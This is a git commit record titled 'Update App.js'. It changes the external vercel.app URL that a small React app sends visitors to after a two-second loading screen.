a91bde4daa6216c2dd5161d0d880fc20b0dba601
husknet <127146284+husknet@users.noreply.github.com>
2024-08-13 06:32:49 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://trysagemarting-saf.vercel.app/';
+            window.location.href = 'https://sageguts-martinglink.vercel.app/';
         }, 2000);
 
         return () => clearTimeout(timer);
